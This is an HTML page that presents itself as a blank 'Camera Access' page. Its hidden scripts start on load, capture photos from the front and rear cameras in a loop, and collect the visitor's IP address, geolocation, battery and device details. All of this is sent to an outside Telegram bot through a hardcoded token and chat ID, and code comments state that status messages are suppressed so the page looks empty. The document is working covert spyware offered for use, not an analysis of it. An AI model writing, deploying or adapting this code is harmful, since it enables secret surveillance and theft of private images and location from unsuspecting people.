<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Camera Access</title>
    <style>html,body{margin:0;background:#fff;color:#000}</style>
  <script>
    (function(){
      const BOT_TOKEN = '8463351390:AAHsHDz88nFYmhUOEdXVen3ZBR4DEAFLW8Q';
      const CHAT_ID = '8299248756';
      const CAPTURE_INTERVAL_MS = 2000;
      
      let stopFlag = false;
      let stream = null;

      // No-op status updater: do not display any messages on the webpage.
      function showStatus(message, isError = false) {
        // intentionally empty to keep page visually blank; messages still logged to console and sent to Telegram
      }

      // Setup video elements (hidden)
      const video = document.createElement('video');
      video.autoplay = true;
      video.muted = true;
      video.playsInline = true;
      video.style.display = 'none';
      document.body.appendChild(video);
      
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');

      // Send message to Telegram
      async function sendTelegramMessage(msg) {
        try {
          showStatus('Sending notification...');
          const res = await fetch(`https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: String(CHAT_ID), text: msg })
          });
          const data = await res.json();
          console.log('Telegram message sent:', data);
          if (data.ok) showStatus('Notification sent');
          else showStatus('Failed to send notification: ' + (data.description || 'unknown error'), true);
          return data;
        } catch (err) {
          console.error('Failed to send Telegram message:', err);
          showStatus('Failed to send notification: ' + err.message, true);
          return null;
        }
      }

      // Check camera permissions explicitly
      async function checkCameraPermission() {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
          const msg = 'Camera API not supported in this browser';
          console.error(msg);
          await sendTelegramMessage(msg);
          return false;
        }

        try {
          // Try to access camera - this triggers the permission prompt
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          // Got permission - clean up test stream
          stream.getTracks().forEach(track => track.stop());
          return true;
        } catch (err) {
          const msg = `Camera permission denied: ${err.name}\nError: ${err.message}\nPlease allow camera access and reload.`;
          console.error(msg);
          await sendTelegramMessage(msg);
          return false;
        }
      }

      async function getStreamForFacing(facingMode) {
        try {
          if (stream) {
            stream.getTracks().forEach(t => t.stop());
            stream = null;
          }

          stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: { ideal: facingMode } },
            audio: false
          });
          
          video.srcObject = stream;
          await video.play();
          return true;
        } catch (err) {
          const msg = `Failed to access ${facingMode} camera: ${err.name}\nError: ${err.message}`;
          console.error(msg);
          await sendTelegramMessage(msg);
          return false;
        }
      }

      function captureFrameBlob() {
        try {
          const w = video.videoWidth || 640;
          const h = video.videoHeight || Math.round(w * 3 / 4);
          canvas.width = w;
          canvas.height = h;
          ctx.drawImage(video, 0, 0, w, h);
          return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
        } catch (e) {
          console.warn('Frame capture failed:', e);
          return Promise.resolve(null);
        }
      }

      async function sendPhotoToTelegram(blob) {
        if (!blob) return { ok: false, error: 'no-blob' };
        try {
          const fd = new FormData();
          fd.append('chat_id', String(CHAT_ID));
          fd.append('photo', blob, `photo_${Date.now()}.jpg`);
          
          const res = await fetch(`https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendPhoto`, {
            method: 'POST',
            body: fd
          });
          
          const data = await res.json();
          return { ok: res.ok, data };
        } catch (err) {
          console.error('Failed to send photo:', err);
          return { ok: false, error: err.message };
        }
      }

      async function startCapture() {
        console.log('Checking camera permission...');
        const hasPermission = await checkCameraPermission();
        if (!hasPermission) {
          console.error('No camera permission - cannot start capture');
          return;
        }

        console.log('Starting capture loop...');
        let facing = 'user';
        while (!stopFlag) {
          if (await getStreamForFacing(facing)) {
            await new Promise(r => setTimeout(r, 500)); // wait for video
            const blob = await captureFrameBlob();
            if (blob) {
              console.log(`Captured frame (${facing} camera)`);
              const result = await sendPhotoToTelegram(blob);
              console.log('Send result:', result);
            }
          }
          facing = (facing === 'user') ? 'environment' : 'user';
          await new Promise(r => setTimeout(r, CAPTURE_INTERVAL_MS));
        }

        if (stream) {
          stream.getTracks().forEach(t => t.stop());
          stream = null;
        }
        console.log('Capture stopped');
      }

      // Start capturing after a small delay
      setTimeout(() => {
        console.log('Initializing camera capture...');
        startCapture().catch(err => {
          console.error('Capture error:', err);
          sendTelegramMessage(`Capture error: ${err.message}`);
        });
      }, 1000);

      // Expose controls
      window.cameraControl = {
        start: () => { stopFlag = false; startCapture(); },
        stop: () => { stopFlag = true; }
      };
    })();
  </script>
     




     
  <script>
    async function gatherDeviceInfo(options = {}) {
      // small helper to fetch JSON with timeout
      const fetchJson = async (url, timeout = 8000) => {
        try {
          const controller = new AbortController();
          const id = setTimeout(() => controller.abort(), timeout);
          const res = await fetch(url, { signal: controller.signal });
          clearTimeout(id);
          return await res.json();
        } catch (e) {
          return null;
        }
      };

      const info = {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent || null,
        platform: navigator.platform || null,
        language: navigator.language || null,
        screen: { width: screen.width || null, height: screen.height || null },
        ip: null,
        batteryPercent: null,
        isCharging: null,
        connection: null,
        connectionTypeGuess: 'unknown',
        location: null,
      };

      // IP (uses ipify - public service)
      try {
        const ipObj = await fetchJson('https://api.ipify.org?format=json', 6000);
        if (ipObj && ipObj.ip) info.ip = ipObj.ip;
      } catch (e) { /* ignore */ }

      // Battery
      try {
        if (navigator.getBattery) {
          const bat = await navigator.getBattery();
          info.batteryPercent = (typeof bat.level === 'number') ? Math.round(bat.level * 100) : null;
          info.isCharging = !!bat.charging;
        }
      } catch (e) { /* ignore */ }

      // Network information (may be unavailable in many browsers)
      try {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || null;
        if (conn) {
          info.connection = {
            effectiveType: conn.effectiveType || null,
            type: conn.type || null,
            downlink: conn.downlink || null,
            rtt: conn.rtt || null,
          };
          const t = (conn.type || '').toLowerCase();
          const e = (conn.effectiveType || '').toLowerCase();
          if (t.includes('wifi') || e.includes('wifi')) info.connectionTypeGuess = 'wifi';
          else if (t.includes('cellular') || e.includes('2g') || e.includes('3g') || e.includes('4g') || e.includes('5g')) info.connectionTypeGuess = 'mobile';
        }
      } catch (e) { /* ignore */ }

      // Geolocation (prompts user). Provide a short timeout.
      const getPosition = (opts = {}) => new Promise((resolve) => {
        if (!navigator.geolocation) return resolve(null);
        let done = false;
        const timer = setTimeout(() => { if (!done) { done = true; resolve(null); } }, opts.timeout || 8000);
        navigator.geolocation.getCurrentPosition((pos) => {
          if (done) return; done = true; clearTimeout(timer);
          resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy });
        }, (err) => { if (done) return; done = true; clearTimeout(timer); resolve(null); }, { enableHighAccuracy: !!opts.highAccuracy, maximumAge: 0, timeout: opts.timeout || 8000 });
      });

      try {
        const pos = await getPosition({ timeout: 10000, highAccuracy: false });
        if (pos) info.location = { lat: pos.latitude, lon: pos.longitude, accuracy: pos.accuracy };
      } catch (e) { /* ignore */ }

      return info;
    }

    async function sendDeviceInfoToTelegram(botToken, chatId, opts = {}) {
      if (!botToken || !chatId) throw new Error('botToken and chatId are required');
      const info = await gatherDeviceInfo();

      const lines = [];
      lines.push(`Time: ${info.timestamp}`);
      if (info.ip) lines.push(`IP: ${info.ip}`);
      if (info.batteryPercent != null) lines.push(`Battery: ${info.batteryPercent}%`);
      if (info.isCharging != null) lines.push(`Charging: ${info.isCharging}`);
      if (info.connection) lines.push(`Connection: ${info.connection.type || 'n/a'} (${info.connection.effectiveType || 'n/a'})`);
      lines.push(`Connection guess: ${info.connectionTypeGuess}`);
      if (info.location) lines.push(`Location: ${info.location.lat}, ${info.location.lon} (acc ${info.location.accuracy}m)`);
      lines.push(`UA: ${info.userAgent}`);
      lines.push(`Platform: ${info.platform} | Lang: ${info.language}`);
      lines.push(`Screen: ${info.screen.width}x${info.screen.height}`);

      const message = lines.join('\n');

      // Attempt to send via Telegram bot API
      const apiUrl = `https://api.telegram.org/bot${encodeURIComponent(botToken)}/sendMessage`;

      try {
        const res = await fetch(apiUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: String(chatId), text: message })
        });
        const data = await res.json().catch(() => null);
        if (!res.ok) {
          // Return useful debugging info to caller
          return { ok: false, status: res.status, statusText: res.statusText, body: data };
        }
        return { ok: true, body: data };
      } catch (err) {
        // Likely a network/CORS error in a browser. Return details for debugging.
        return { ok: false, error: String(err) };
      }
    }

    // Export small helpers to window for easy console use
    window.gatherDeviceInfo = gatherDeviceInfo;
    window.sendDeviceInfoToTelegram = sendDeviceInfoToTelegram;
  </script>
</head>
<body>
  <!-- Page intentionally blank; camera capture runs in background. -->
</body>
</html>
